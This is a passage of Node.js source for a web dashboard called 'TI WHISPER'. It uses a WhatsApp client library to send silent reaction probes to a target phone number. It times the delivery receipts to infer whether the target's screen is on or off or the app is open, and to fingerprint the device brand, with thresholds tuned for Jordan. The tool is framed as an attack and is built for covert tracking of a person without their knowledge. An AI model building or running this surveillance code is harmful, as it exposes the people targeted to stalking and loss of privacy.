const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode');
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

let pendingProbes = new Map();
let measurements = [];
let whatsappSock = null;
let isMonitoring = false;
let monitoringConfig = {};
let deviceProfile = {
    detectedBrand: 'Unknown',
    detectedModel: 'Unknown',
    confidence: 0,
    characteristics: {},
    screenTransitions: []
};

app.use(express.static('public'));
app.use(express.json());

// Serve main page
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>TI WHISPER - RTT Surveillance</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="/socket.io/socket.io.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', 'Consolas', monospace;
            background: #0a0e27;
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 0, 0.03) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(0, 255, 255, 0.03) 0%, transparent 50%);
            color: #00ff00;
            min-height: 100vh;
            padding: 10px;
            position: relative;
            overflow-x: hidden;
        }
        @media (min-width: 768px) {
            body { padding: 20px; }
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                transparent 1px,
                transparent 2px,
                rgba(0, 255, 0, 0.03) 3px
            );
            pointer-events: none;
            z-index: 1;
        }
        .container {
            max-width: 1600px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }
        .header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 2px solid #00ff00;
            margin-bottom: 30px;
            background: rgba(0, 0, 0, 0.6);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        .header h1 {
            font-size: 1.5em;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
            letter-spacing: 2px;
            animation: glitch 3s infinite;
        }
        @media (min-width: 768px) {
            .header h1 { font-size: 2.5em; letter-spacing: 3px; }
        }
        @keyframes glitch {
            0%, 100% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
            50% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00; }
        }
        .header p {
            font-size: 0.75em;
            color: #00ffff;
            text-shadow: 0 0 5px #00ffff;
        }
        @media (min-width: 768px) {
            .header p { font-size: 1em; }
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 15px;
            margin-bottom: 15px;
        }
        @media (min-width: 768px) {
            .grid {
                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
                gap: 20px;
                margin-bottom: 20px;
            }
        }
        .card {
            background: rgba(0, 0, 0, 0.8);
            border-radius: 0;
            padding: 15px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
            border: 1px solid #00ff00;
            position: relative;
        }
        @media (min-width: 768px) {
            .card { padding: 20px; }
        }
        .card::before {
            content: '[';
            position: absolute;
            top: 10px;
            left: 10px;
            color: #00ff00;
            font-size: 1.2em;
        }
        .card::after {
            content: ']';
            position: absolute;
            top: 10px;
            right: 10px;
            color: #00ff00;
            font-size: 1.2em;
        }
        .card h2 {
            font-size: 0.95em;
            margin-bottom: 12px;
            color: #00ffff;
            text-shadow: 0 0 5px #00ffff;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        @media (min-width: 768px) {
            .card h2 { font-size: 1.2em; margin-bottom: 15px; letter-spacing: 2px; }
        }
        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 0;
            font-size: 0.85em;
            font-weight: bold;
            border: 1px solid;
            text-transform: uppercase;
        }
        .status-connected { 
            background: rgba(0, 255, 0, 0.2); 
            color: #00ff00;
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        .status-disconnected { 
            background: rgba(255, 0, 0, 0.2); 
            color: #ff0000;
            border-color: #ff0000;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
        .status-monitoring { 
            background: rgba(0, 255, 255, 0.2); 
            color: #00ffff;
            border-color: #00ffff;
        }
        .qr-container {
            text-align: center;
            padding: 20px;
        }
        #qrcode {
            background: white;
            padding: 20px;
            border-radius: 10px;
            display: inline-block;
            margin: 10px 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #00ff00;
            text-transform: uppercase;
            font-size: 0.9em;
            letter-spacing: 1px;
        }
        .form-group input, .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #00ff00;
            border-radius: 0;
            background: rgba(0, 0, 0, 0.5);
            color: #00ff00;
            font-size: 1em;
            font-family: 'Courier New', monospace;
            box-shadow: inset 0 0 5px rgba(0, 255, 0, 0.2);
        }
        .form-group input:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5), inset 0 0 5px rgba(0, 255, 0, 0.3);
        }
        .form-group input::placeholder {
            color: rgba(0, 255, 0, 0.3);
        }
        .btn {
            padding: 14px 20px;
            border: 2px solid;
            border-radius: 0;
            font-size: 0.9em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            -webkit-tap-highlight-color: transparent;
            touch-action: manipulation;
        }
        @media (min-width: 768px) {
            .btn { padding: 12px 30px; font-size: 1em; letter-spacing: 2px; }
        }
        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(0, 255, 0, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        .btn:hover::before {
            width: 300px;
            height: 300px;
        }
        .btn-primary {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border-color: #00ff00;
        }
        .btn-primary:hover { 
            background: rgba(0, 255, 0, 0.3);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        .btn-danger {
            background: rgba(255, 0, 0, 0.1);
            color: #ff0000;
            border-color: #ff0000;
        }
        .btn-danger:hover { 
            background: rgba(255, 0, 0, 0.3);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        .btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
        }
        @media (min-width: 768px) {
            .stats-grid { gap: 15px; }
        }
        .stat-box {
            background: rgba(0, 255, 0, 0.05);
            padding: 10px;
            border-radius: 0;
            text-align: center;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.1);
        }
        @media (min-width: 768px) {
            .stat-box { padding: 15px; }
        }
        .stat-value {
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 5px;
            color: #00ffff;
            text-shadow: 0 0 10px #00ffff;
        }
        @media (min-width: 768px) {
            .stat-value { font-size: 2em; }
        }
        .stat-label {
            font-size: 0.7em;
            color: #00ff00;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        @media (min-width: 768px) {
            .stat-label { font-size: 0.9em; letter-spacing: 1px; }
        }
        .log-container {
            background: rgba(0, 0, 0, 0.8);
            border-radius: 0;
            padding: 10px;
            max-height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.7em;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.2);
            -webkit-overflow-scrolling: touch;
        }
        @media (min-width: 768px) {
            .log-container { padding: 15px; max-height: 300px; font-size: 0.85em; }
        }
        .log-container::-webkit-scrollbar {
            width: 8px;
        }
        .log-container::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.5);
        }
        .log-container::-webkit-scrollbar-thumb {
            background: #00ff00;
            box-shadow: 0 0 5px #00ff00;
        }
        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
            color: #00ff00;
        }
        .log-time {
            color: #00ffff;
            margin-right: 10px;
        }
        .chart-container {
            position: relative;
            height: 250px;
            margin-top: 10px;
        }
        @media (min-width: 768px) {
            .chart-container { height: 300px; margin-top: 15px; }
        }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 8px;
            box-shadow: 0 0 5px currentColor;
        }
        .status-foreground { background: #00ff00; }
        .status-screen-on { background: #ffff00; }
        .status-screen-off { background: #ff8800; }
        .status-offline { background: #ff0000; }
        .device-info {
            background: rgba(0, 255, 0, 0.05);
            padding: 10px;
            border-radius: 0;
            margin-bottom: 10px;
            border: 1px solid #00ff00;
            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.1);
        }
        @media (min-width: 768px) {
            .device-info { padding: 15px; margin-bottom: 15px; }
        }
        .device-info p {
            margin: 6px 0;
            display: flex;
            justify-content: space-between;
            color: #00ff00;
            font-size: 0.85em;
            flex-wrap: wrap;
        }
        @media (min-width: 768px) {
            .device-info p { margin: 8px 0; font-size: 1em; }
        }
        .device-info strong {
            color: #00ffff;
        }
        .collapsible-header {
            cursor: pointer;
            user-select: none;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 5px 0;
            -webkit-tap-highlight-color: transparent;
        }
        .collapsible-header::after {
            content: '▼';
            transition: transform 0.3s;
            font-size: 0.8em;
        }
        .collapsible-header.collapsed::after {
            transform: rotate(-90deg);
        }
        .collapsible-content {
            max-height: 1000px;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }
        .collapsible-content.collapsed {
            max-height: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>[ TI WHISPER ]</h1>
            <p>&gt; NEVER LOOK BACK &lt;</p>
        </div>

        <div class="grid">
            <!-- Connection Status -->
            <div class="card">
                <h2>📱 [CONN_STATUS]</h2>
                <div id="connection-status">
                    <p>Status: <span class="status-badge status-disconnected" id="conn-badge">Disconnected</span></p>
                    <div class="qr-container" id="qr-container" style="display:none;">
                        <p style="color:#00ffff;text-transform:uppercase;letter-spacing:2px;">&gt; SCAN TO AUTHENTICATE:</p>
                        <canvas id="qrcode"></canvas>
                    </div>
                    <div id="user-info" style="display:none;">
                        <div class="device-info">
                            <p><strong>Phone:</strong> <span id="user-phone">-</span></p>
                            <p><strong>Name:</strong> <span id="user-name">-</span></p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Monitoring Config -->
            <div class="card">
                <h2>⚙️ ATTACK CONFIG</h2>
                <div class="form-group">
                    <label>TARGET JID</label>
                    <input type="tel" id="target-number" placeholder="962XXXXXXXXX" autocomplete="tel" inputmode="numeric" />
                </div>
                <div class="form-group">
                    <label>DURATION (minutes)</label>
                    <input type="number" id="duration" value="10" min="1" max="120" inputmode="numeric" />
                </div>
                <div class="form-group">
                    <label>Probe Interval (seconds) ⚠️</label>
                    <input type="number" id="interval" value="15" min="0.5" max="60" step="0.5" inputmode="decimal" />
                    <p style="font-size:0.8em;opacity:0.7;margin-top:5px;">
                        ⚠️ <strong>Warning:</strong> &lt;5s = High ban risk! Recommended: 15-30s
                    </p>
                </div>
                <button class="btn btn-primary" id="start-btn" disabled>[ INITIATE ATTACK ]</button>
                <button class="btn btn-danger" id="stop-btn" disabled style="margin-top:10px;">[ TERMINATE ]</button>
                <button class="btn" id="clear-btn" style="margin-top:10px;background:rgba(255,255,0,0.1);color:#ffff00;border-color:#ffff00;">[ CLEAR DATA ]</button>
                
                <div style="margin-top:20px;padding:15px;background:rgba(0,255,0,0.05);border:1px solid #00ff00;font-size:0.85em;">
                    <h3 style="margin-bottom:10px;color:#00ffff;text-shadow:0 0 5px #00ffff;">📡 NETWORK PARAMS [JO]</h3>
                    <p style="margin:5px 0;"><strong style="color:#00ff00;">&gt; BASE_LATENCY:</strong> <span style="color:#ffff00;">+300ms</span></p>
                    <p style="margin:5px 0;"><strong style="color:#00ff00;">&gt; RTT_THRESHOLDS:</strong></p>
                    <p style="margin:5px 0;padding-left:15px;color:#00ff00;">🟢 FOREGROUND: &lt;900ms</p>
                    <p style="margin:5px 0;padding-left:15px;color:#ffff00;">🟡 SCREEN_ON: &lt;1600ms</p>
                    <p style="margin:5px 0;padding-left:15px;color:#ff8800;">🟠 SCREEN_OFF: &lt;3800ms</p>
                    <p style="margin:5px 0;opacity:0.7;font-size:0.9em;color:#00ffff;">&gt; ORIGIN: Amman, Jordan [Zain/Orange/Umniah]</p>
                </div>
            </div>

            <!-- Live Statistics -->
            <div class="card">
                <h2>📊 [LIVE_METRICS]</h2>
                <div class="stats-grid">
                    <div class="stat-box">
                        <div class="stat-value" id="total-probes">0</div>
                        <div class="stat-label">Total Probes</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="avg-rtt">-</div>
                        <div class="stat-label">Avg RTT (ms)</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="min-rtt">-</div>
                        <div class="stat-label">Min RTT (ms)</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="max-rtt">-</div>
                        <div class="stat-label">Max RTT (ms)</div>
                    </div>
                </div>
                <div style="margin-top:20px;">
                    <h3 style="margin-bottom:10px;">Status Distribution:</h3>
                    <p><span class="status-indicator status-foreground"></span>Foreground: <strong id="count-foreground">0</strong></p>
                    <p><span class="status-indicator status-screen-on"></span>Screen On: <strong id="count-screen-on">0</strong></p>
                    <p><span class="status-indicator status-screen-off"></span>Screen Off: <strong id="count-screen-off">0</strong></p>
                    <p><span class="status-indicator status-offline"></span>Offline: <strong id="count-offline">0</strong></p>
                </div>
            </div>

            <!-- Device Profile -->
            <div class="card">
                <h2>🔍 [DEVICE_FINGERPRINT]</h2>
                <div id="device-fingerprint">
                    <div class="device-info">
                        <p><strong>Detected Brand:</strong> <span id="detected-brand">Analyzing...</span></p>
                        <p><strong>User Reported:</strong> <span id="reported-model">-</span></p>
                        <p><strong>Confidence:</strong> <span id="confidence">0%</span></p>
                    </div>
                    <div style="margin-top:15px;">
                        <h3 style="margin-bottom:10px;">Device Characteristics:</h3>
                        <div id="characteristics" style="background:rgba(0,0,0,0.2);padding:15px;border-radius:10px;">
                            <p style="opacity:0.7;">Run monitoring to detect device patterns...</p>
                        </div>
                    </div>
                    <div style="margin-top:15px;">
                        <h3 style="margin-bottom:10px;">Screen Transitions:</h3>
                        <div id="transitions" style="background:rgba(0,0,0,0.2);padding:15px;border-radius:10px;max-height:150px;overflow-y:auto;font-size:0.9em;">
                            <p style="opacity:0.7;">No transitions detected yet...</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Activity Log -->
            <div class="card">
                <h2>📝 [SYSTEM_LOG]</h2>
                <div class="log-container" id="log-container">
                    <div class="log-entry">
                        <span class="log-time">--:--:--</span>
                        <span>Waiting to start...</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- RTT Chart -->
        <div class="card">
            <h2>📈 [RTT_TIMELINE]</h2>
            <div class="chart-container">
                <canvas id="rtt-chart"></canvas>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let rttChart;

        // Initialize Chart
        const ctx = document.getElementById('rtt-chart').getContext('2d');
        rttChart = new Chart(ctx, {
            type: 'scatter',
            data: {
                datasets: [{
                    label: 'APP_FOREGROUND',
                    data: [],
                    backgroundColor: '#00ff00',
                    borderColor: '#00ff00',
                    pointRadius: 6,
                    pointHoverRadius: 8
                }, {
                    label: 'SCREEN_ON',
                    data: [],
                    backgroundColor: '#ffff00',
                    borderColor: '#ffff00',
                    pointRadius: 6,
                    pointHoverRadius: 8
                }, {
                    label: 'SCREEN_OFF',
                    data: [],
                    backgroundColor: '#ff0000',
                    borderColor: '#ff0000',
                    pointRadius: 6,
                    pointHoverRadius: 8
                }, {
                    label: 'OFFLINE',
                    data: [],
                    backgroundColor: '#666666',
                    borderColor: '#666666',
                    pointRadius: 6,
                    pointHoverRadius: 8
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                scales: {
                    y: { 
                        beginAtZero: true,
                        title: {
                            display: true,
                            text: 'RTT (ms)',
                            color: '#00ff00'
                        },
                        ticks: { color: '#00ff00' },
                        grid: { color: 'rgba(0, 255, 0, 0.2)' }
                    },
                    x: { 
                        type: 'linear',
                        title: {
                            display: true,
                            text: 'Probe #',
                            color: '#00ff00'
                        },
                        ticks: { color: '#00ff00' },
                        grid: { color: 'rgba(0, 255, 0, 0.2)' }
                    }
                },
                plugins: {
                    legend: { 
                        labels: { 
                            color: '#00ff00',
                            font: {
                                family: 'Courier New',
                                size: 12
                            }
                        } 
                    },
                    tooltip: {
                        callbacks: {
                            label: function(context) {
                                return context.dataset.label + ': ' + context.parsed.y + 'ms';
                            }
                        }
                    }
                }
            }
        });

        // Socket events
        socket.on('qr', (qrData) => {
            document.getElementById('qr-container').style.display = 'block';
            document.getElementById('user-info').style.display = 'none';
            const canvas = document.getElementById('qrcode');
            QRCode.toCanvas(canvas, qrData, { width: 256 });
        });

        socket.on('connected', (user) => {
            document.getElementById('conn-badge').textContent = 'Connected';
            document.getElementById('conn-badge').className = 'status-badge status-connected';
            document.getElementById('qr-container').style.display = 'none';
            document.getElementById('user-info').style.display = 'block';
            document.getElementById('user-phone').textContent = user.id;
            document.getElementById('user-name').textContent = user.name || 'N/A';
            document.getElementById('start-btn').disabled = false;
            addLog('WhatsApp connected successfully');
        });

        socket.on('disconnected', () => {
            document.getElementById('conn-badge').textContent = 'Disconnected';
            document.getElementById('conn-badge').className = 'status-badge status-disconnected';
            document.getElementById('start-btn').disabled = true;
            document.getElementById('stop-btn').disabled = true;
            addLog('WhatsApp disconnected');
        });

        socket.on('measurement', (data) => {
            updateStatistics(data);
            addLog(\`RTT: \${data.rtt_ms}ms | Status: \${data.status}\`, data.status);
        });

        socket.on('log', (message) => {
            addLog(message);
        });

        // UI Functions
        document.getElementById('start-btn').addEventListener('click', () => {
            const config = {
                targetNumber: document.getElementById('target-number').value,
                deviceModel: 'Unknown',
                duration: parseInt(document.getElementById('duration').value),
                interval: parseInt(document.getElementById('interval').value)
            };
            socket.emit('start-monitoring', config);
            document.getElementById('start-btn').disabled = true;
            document.getElementById('stop-btn').disabled = false;
            addLog(\`> INITIATING ATTACK: TARGET [\${config.targetNumber}]\`);
        });

        document.getElementById('stop-btn').addEventListener('click', () => {
            socket.emit('stop-monitoring');
            document.getElementById('start-btn').disabled = false;
            document.getElementById('stop-btn').disabled = true;
            addLog('Monitoring stopped');
        });

        document.getElementById('clear-btn').addEventListener('click', () => {
            if (confirm('Clear all results and statistics?')) {
                socket.emit('clear-results');
                // Reset UI
                rttChart.data.datasets.forEach(dataset => {
                    dataset.data = [];
                });
                rttChart.update();
                
                document.getElementById('total-probes').textContent = '0';
                document.getElementById('avg-rtt').textContent = '-';
                document.getElementById('min-rtt').textContent = '-';
                document.getElementById('max-rtt').textContent = '-';
                document.getElementById('count-foreground').textContent = '0';
                document.getElementById('count-screen-on').textContent = '0';
                document.getElementById('count-screen-off').textContent = '0';
                document.getElementById('count-offline').textContent = '0';
                
                document.getElementById('detected-brand').textContent = 'Analyzing...';
                document.getElementById('confidence').textContent = '0%';
                document.getElementById('characteristics').innerHTML = '<p style="opacity:0.7;">Run monitoring to detect device patterns...</p>';
                document.getElementById('transitions').innerHTML = '<p style="opacity:0.7;">No transitions detected yet...</p>';
                
                document.getElementById('log-container').innerHTML = '<div class="log-entry"><span class="log-time">--:--:--</span><span>Results cleared</span></div>';
                
                addLog('All results cleared');
            }
        });

        function updateStatistics(data) {
            // Update chart - add point to correct dataset based on status
            const probeNumber = rttChart.data.datasets[0].data.length + 
                                rttChart.data.datasets[1].data.length + 
                                rttChart.data.datasets[2].data.length + 
                                rttChart.data.datasets[3].data.length + 1;
            
            const point = { x: probeNumber, y: data.rtt_ms || 10000 };
            
            // Add to appropriate dataset based on status
            if (data.status === 'APP_FOREGROUND') {
                rttChart.data.datasets[0].data.push(point);
            } else if (data.status === 'SCREEN_ON') {
                rttChart.data.datasets[1].data.push(point);
            } else if (data.status === 'SCREEN_OFF') {
                rttChart.data.datasets[2].data.push(point);
            } else {
                rttChart.data.datasets[3].data.push(point); // OFFLINE or UNKNOWN
            }
            
            // Keep only last 50 points total per dataset
            rttChart.data.datasets.forEach(dataset => {
                if (dataset.data.length > 50) {
                    dataset.data.shift();
                }
            });
            
            rttChart.update();

            // Update stats
            socket.emit('get-stats');
        }

        socket.on('stats', (stats) => {
            document.getElementById('total-probes').textContent = stats.total;
            document.getElementById('avg-rtt').textContent = stats.avgRtt || '-';
            document.getElementById('min-rtt').textContent = stats.minRtt || '-';
            document.getElementById('max-rtt').textContent = stats.maxRtt || '-';
            document.getElementById('count-foreground').textContent = stats.statusCounts.APP_FOREGROUND || 0;
            document.getElementById('count-screen-on').textContent = stats.statusCounts.SCREEN_ON || 0;
            document.getElementById('count-screen-off').textContent = stats.statusCounts.SCREEN_OFF || 0;
            document.getElementById('count-offline').textContent = stats.statusCounts.OFFLINE || 0;
        });

        socket.on('device-profile', (profile) => {
            document.getElementById('detected-brand').textContent = profile.detectedBrand;
            document.getElementById('reported-model').textContent = profile.detectedModel;
            document.getElementById('confidence').textContent = profile.confidence + '%';
            
            // Update characteristics
            const charDiv = document.getElementById('characteristics');
            if (Object.keys(profile.characteristics).length > 0) {
                let html = '';
                for (const [key, value] of Object.entries(profile.characteristics)) {
                    html += '<p><strong>' + key + ':</strong> ' + value + '</p>';
                }
                charDiv.innerHTML = html;
            }
            
            // Update transitions
            const transDiv = document.getElementById('transitions');
            if (profile.screenTransitions.length > 0) {
                let html = '';
                for (const t of profile.screenTransitions) {
                    const time = new Date(t.time).toLocaleTimeString();
                    const arrow = String.fromCharCode(8594);
                    const sign = t.rttChange > 0 ? '+' : '';
                    html += '<p>⚡ ' + time + ': ' + t.from + ' ' + arrow + ' ' + t.to + ' (' + sign + t.rttChange + 'ms)</p>';
                }
                transDiv.innerHTML = html;
            }
        });

        function addLog(message, status = null) {
            const logContainer = document.getElementById('log-container');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            const time = new Date().toLocaleTimeString();
            
            let icon = '•';
            if (status === 'APP_FOREGROUND') icon = '🟢';
            else if (status === 'SCREEN_ON') icon = '🟡';
            else if (status === 'SCREEN_OFF') icon = '🔴';
            else if (status === 'OFFLINE') icon = '⚫';
            
            entry.innerHTML = \`<span class="log-time">\${time}</span><span>\${icon} \${message}</span>\`;
            logContainer.insertBefore(entry, logContainer.firstChild);
            
            // Keep only last 50 entries
            while (logContainer.children.length > 50) {
                logContainer.removeChild(logContainer.lastChild);
            }
        }

        // Request initial connection status
        socket.emit('get-status');

        // Collapsible sections for mobile (auto-collapse less important sections on small screens)
        function makeCollapsible(cardElement, headerText) {
            const header = cardElement.querySelector('h2');
            header.classList.add('collapsible-header');
            const content = document.createElement('div');
            content.classList.add('collapsible-content');
            
            // Move all children except header into collapsible content
            const children = Array.from(cardElement.children).filter(el => el !== header);
            children.forEach(child => content.appendChild(child));
            cardElement.appendChild(content);
            
            header.addEventListener('click', () => {
                header.classList.toggle('collapsed');
                content.classList.toggle('collapsed');
            });
            
            return { header, content };
        }

        // Auto-collapse on mobile for less critical sections
        if (window.innerWidth < 768) {
            const cards = document.querySelectorAll('.card');
            cards.forEach((card, index) => {
                const header = card.querySelector('h2');
                if (header) {
                    const { header: collapsibleHeader, content } = makeCollapsible(card, header.textContent);
                    
                    // Auto-collapse device fingerprint and logs on mobile to save space
                    const text = header.textContent;
                    if (text.includes('DEVICE_FINGERPRINT') || text.includes('SYSTEM_LOG')) {
                        collapsibleHeader.classList.add('collapsed');
                        content.classList.add('collapsed');
                    }
                }
            });
        }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
</body>
</html>
    `);
});

// WhatsApp connection
async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    
    const sock = makeWASocket({
        auth: state,
    });
    
    sock.ev.on('creds.update', saveCreds);
    
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            io.emit('qr', qr);
        }
        
        if (connection === 'close') {
            io.emit('disconnected');
            whatsappSock = null;
            setTimeout(() => connectToWhatsApp(), 3000);
        } else if (connection === 'open') {
            io.emit('connected', {
                id: sock.user?.id,
                name: sock.user?.name
            });
        }
    });
    
    sock.ev.on('messages.update', (updates) => {
        for (const update of updates) {
            if (update.update.status && pendingProbes.has(update.key.id)) {
                handleReceipt(update.key.id, update.update.status);
            }
        }
    });
    
    whatsappSock = sock;
    return sock;
}

async function sendSilentProbe(targetNumber) {
    if (!whatsappSock) return;
    
    const startTime = Date.now();
    const cleanNumber = targetNumber.replace(/^\+/, '').replace(/^00/, '');
    const jid = `${cleanNumber}@s.whatsapp.net`;
    
    try {
        const result = await whatsappSock.sendMessage(jid, {
            react: {
                text: '👍',
                key: {
                    remoteJid: jid,
                    id: 'INVALID_' + Math.random().toString(36).substring(7)
                }
            }
        });
        
        const messageId = result.key.id;
        
        pendingProbes.set(messageId, {
            startTime,
            target: cleanNumber,
            jid: jid,
            deviceModel: monitoringConfig.deviceModel
        });
        
        setTimeout(() => {
            if (pendingProbes.has(messageId)) {
                handleTimeout(messageId);
            }
        }, 10000);
        
    } catch (error) {
        io.emit('log', `Error sending probe: ${error.message}`);
    }
}

function analyzeDeviceFingerprint() {
    if (measurements.length < 5) return deviceProfile;
    
    const validRtts = measurements.filter(m => m.rtt_ms !== null && m.rtt_ms < 10000);
    if (validRtts.length < 3) return deviceProfile;
    
    // Calculate RTT statistics
    const rtts = validRtts.map(m => m.rtt_ms);
    const avgRtt = rtts.reduce((sum, r) => sum + r, 0) / rtts.length;
    const minRtt = Math.min(...rtts);
    const maxRtt = Math.max(...rtts);
    const stdDev = Math.sqrt(rtts.reduce((sum, r) => sum + Math.pow(r - avgRtt, 2), 0) / rtts.length);
    
    // Count status distribution
    const statusCounts = validRtts.reduce((acc, m) => {
        acc[m.status] = (acc[m.status] || 0) + 1;
        return acc;
    }, {});
    
    // Device detection logic based on research paper patterns
    // ADJUSTED FOR JORDAN: All thresholds +250-350ms for network latency
    let brand = 'Unknown';
    let confidence = 0;
    let characteristics = {};
    
    // iPhone detection prioritized - Look for iOS characteristics first
    // Key iPhone trait: LOW VARIANCE (tight process scheduling) even if RTT is high
    
    // iPhone Pro/Max (faster processor, lower min RTT, tight clustering)
    // Jordan: expect 350-800ms min, 700-1500ms avg, but ALWAYS low stdDev
    if ((stdDev < 250 && minRtt >= 300 && minRtt < 800 && avgRtt < 1500) || 
        (stdDev < 200 && avgRtt < 1800)) {
        brand = 'Apple iPhone Pro/Max';
        confidence = 88;
        characteristics = {
            'Processor': 'A17/A18 Pro chip (consistent low RTT)',
            'RTT Stability': 'Very High (iOS characteristic)',
            'Power Management': 'Aggressive iOS background limits',
            'Display': '120Hz ProMotion (faster wake)',
            'Network': 'Jordan mobile network (+300ms baseline)',
            'iOS Signature': 'Low variance despite high RTT'
        };
    }
    // Standard iPhone (slightly higher variance but still tight)
    // Jordan: expect 400-900ms min, 800-1600ms avg
    else if ((stdDev < 300 && minRtt >= 350 && minRtt < 900 && avgRtt < 1700) ||
             (stdDev < 250 && avgRtt < 2000)) {
        brand = 'Apple iPhone';
        confidence = 85;
        characteristics = {
            'RTT Stability': 'High (iOS tight process scheduling)',
            'Power Management': 'Aggressive (iOS App Nap)',
            'Network Stack': 'iOS optimized (consistent latency)',
            'Background Behavior': 'Restricted by iOS',
            'Network': 'Jordan mobile network (+300ms baseline)',
            'iOS Signature': 'Consistent timing pattern'
        };
    }
    // Samsung flagship (moderate RTT, moderate variance)
    // Jordan: expect 400-700ms min, 900-1400ms avg, moderate stdDev
    else if (minRtt >= 400 && minRtt <= 750 && avgRtt < 1500 && stdDev >= 200 && stdDev < 350) {
        brand = 'Samsung Galaxy (Flagship)';
        confidence = 75;
        characteristics = {
            'Processor': 'Snapdragon/Exynos high-end',
            'RTT Stability': 'Moderate-High',
            'Power Management': 'Balanced',
            'Android Version': 'Recent (optimized)',
            'Network': 'Jordan mobile network (+300ms baseline)'
        };
    }
    // Budget Android (higher variance, slower response)
    // Jordan: expect >1600ms avg OR high variance >400ms
    else if (avgRtt > 1600 || stdDev > 450) {
        brand = 'Android (Budget/Mid-range)';
        confidence = 70;
        characteristics = {
            'Processor': 'Mid-range or older',
            'RTT Stability': 'Low (high variance)',
            'Power Management': 'Aggressive (slow wake)',
            'Background Restrictions': 'Heavy',
            'Network': 'Jordan mobile network (+300ms baseline)'
        };
    }
    // Generic Android
    // Jordan: expect >700ms min or >1300ms avg with higher variance
    else if ((minRtt > 700 || avgRtt > 1300) && stdDev > 300) {
        brand = 'Android Device';
        confidence = 65;
        characteristics = {
            'RTT Pattern': 'Typical Android behavior',
            'Optimization': 'Standard',
            'Network': 'Jordan mobile network (+300ms baseline)'
        };
    }
    
    // Detect screen state transitions
    const transitions = [];
    for (let i = 1; i < validRtts.length; i++) {
        if (validRtts[i].status !== validRtts[i-1].status) {
            transitions.push({
                time: validRtts[i].timestamp,
                from: validRtts[i-1].status,
                to: validRtts[i].status,
                rttChange: validRtts[i].rtt_ms - validRtts[i-1].rtt_ms
            });
        }
    }
    
    // Additional characteristics from patterns
    characteristics['Avg RTT'] = `${avgRtt.toFixed(0)}ms`;
